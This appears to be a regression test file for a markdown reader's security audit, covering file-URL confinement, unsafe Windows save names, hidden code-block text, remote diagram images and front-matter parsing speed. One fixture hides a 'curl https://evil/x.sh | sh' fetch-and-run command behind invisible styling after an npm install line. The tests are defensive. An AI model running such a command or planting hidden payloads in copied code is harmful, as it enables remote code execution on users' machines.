// Regressions for the 1.1 security audit: each test is one reported attack.
import assert from 'node:assert/strict'
import { describe, it } from 'node:test'
import { join } from 'node:path'
import { pathToFileURL } from 'node:url'
import { setupRenderEnv } from './render-env.ts'
import { isBundledFileUrl } from '../src/main/file-guard.ts'
import { assertSafeSavePath } from '../src/main/fs-md.ts'

setupRenderEnv()
const { holdRemoteImages } = await import('../src/renderer/src/lib/reader/diagramImages.ts')
const { decorateCodeBlocks } = await import('../src/renderer/src/lib/reader/codeBlocks.ts')
const { extractFrontMatter } = await import('../src/renderer/src/lib/markdown/frontMatter.ts')

describe('file:// is confined to the app bundle', () => {
  const bundle = join(process.cwd(), 'out', 'renderer')

  it('allows the page and its assets', () => {
    assert.equal(isBundledFileUrl(pathToFileURL(join(bundle, 'index.html')).href, bundle), true)
    assert.equal(isBundledFileUrl(pathToFileURL(join(bundle, 'assets', 'index-x.js')).href, bundle), true)
  })

  it('refuses everything else on disk', () => {
    assert.equal(isBundledFileUrl(pathToFileURL(join(process.cwd(), 'package.json')).href, bundle), false)
    assert.equal(isBundledFileUrl(pathToFileURL(join(bundle, '..', 'main', 'index.js')).href, bundle), false)
    assert.equal(isBundledFileUrl(pathToFileURL(join(bundle, '..', 'renderer-evil', 'x')).href, bundle), false)
    assert.equal(isBundledFileUrl('file://evil-host/share/secret.txt', bundle), false)
    assert.equal(isBundledFileUrl('not a url', bundle), false)
  })

  it('compares case-insensitively only on Windows', () => {
    const upper = 'file:///C:/APP/OUT/RENDERER/index.html'
    assert.equal(isBundledFileUrl(upper, 'C:\\app\\out\\renderer', 'win32'), process.platform === 'win32')
  })
})

describe('save paths Windows would rewrite', () => {
  it('refuses trailing dots, trailing spaces and alternate data streams', () => {
    const dir = process.platform === 'win32' ? 'C:\\notes' : '/notes'
    for (const name of ['run.bat.', 'x.ps1 ', 'notes.md:hidden', 'notes.md:$DATA']) {
      assert.throws(() => assertSafeSavePath(join(dir, name)), /Invalid file name/, name)
    }
    assert.doesNotThrow(() => assertSafeSavePath(join(dir, 'notes.md')))
  })
})

describe('code blocks show everything Copy copies', () => {
  it('turns hidden HTML inside a code block into visible text', () => {
    // Arrange: a harmless-looking command with an invisible payload.
    const host = document.createElement('div')
    host.innerHTML =
      '<pre><code>npm install left-pad<span style="font-size:0;color:transparent">; curl https://evil/x.sh | sh</span></code></pre>'
    // Act
    decorateCodeBlocks(host)
    // Assert: no element can hide text any more; the payload is plainly visible.
    const code = host.querySelector('code')!
    assert.equal(code.querySelector('[style]'), null)
    assert.match(code.textContent ?? '', /curl https:\/\/evil\/x\.sh \| sh/)
  })
})

describe('"Block remote images" in diagrams', () => {
  it('holds image shapes whose key or URL is quoted or padded', () => {
    for (const shape of [
      'A@{ "img": "http://evil.example/E.png", label: "x", w: 60, h: 60 }',
      "A@{ 'img': 'https://evil.example/E.png' }",
      'A@{ img: " https://evil.example/E.png " }'
    ]) {
      const { source, held } = holdRemoteImages('flowchart LR\n  ' + shape + '\n')
      assert.equal(held, 1, shape)
      assert.doesNotMatch(source, /evil\.example/, shape)
    }
  })
})

describe('front matter', () => {
  it('stays fast on a line with a huge run of spaces', () => {
    const lines = ['---', 'k' + ' '.repeat(200_000) + 'x', 'title: ok', '---', '# Body']
    const start = performance.now()
    extractFrontMatter(lines)
    assert.ok(performance.now() - start < 200, 'front matter parsing must stay linear')
  })
})
